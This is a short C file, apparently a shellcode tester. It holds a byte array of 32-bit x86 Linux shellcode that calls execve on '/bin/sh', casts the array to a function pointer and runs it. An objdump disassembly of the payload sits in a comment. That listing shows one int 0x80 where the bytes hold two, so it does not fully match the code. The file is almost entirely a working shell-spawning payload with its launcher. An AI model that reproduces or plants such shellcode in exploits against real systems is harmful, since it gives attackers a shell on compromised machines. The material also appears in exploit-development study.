int main(int argc, char **argv)
{
  char code[] = "\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x5b\xb8\x0b\x00\x00"
                "\x00\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80\xcd\x80\x90";
  void (*exeshell)();
  exeshell = (void (*)()) code;
  exeshell(); 
}

/*
a.out:     file format elf32-i386


Disassembly of section .text:

08048058 <_start>:
 8048058:	e8 08 00 00 00       	call   8048065 <_start+0xd>
 804805d:	2f                   	das    
 804805e:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
 8048061:	2f                   	das    
 8048062:	73 68                	jae    80480cc <_start+0x74>
 8048064:	00 5b b8             	add    BYTE PTR [ebx-0x48],bl
 8048067:	0b 00                	or     eax,DWORD PTR [eax]
 8048069:	00 00                	add    BYTE PTR [eax],al
 804806b:	b9 00 00 00 00       	mov    ecx,0x0
 8048070:	ba 00 00 00 00       	mov    edx,0x0
 8048075:	cd 80                	int    0x80
 8048077:	90                   	nop
*/
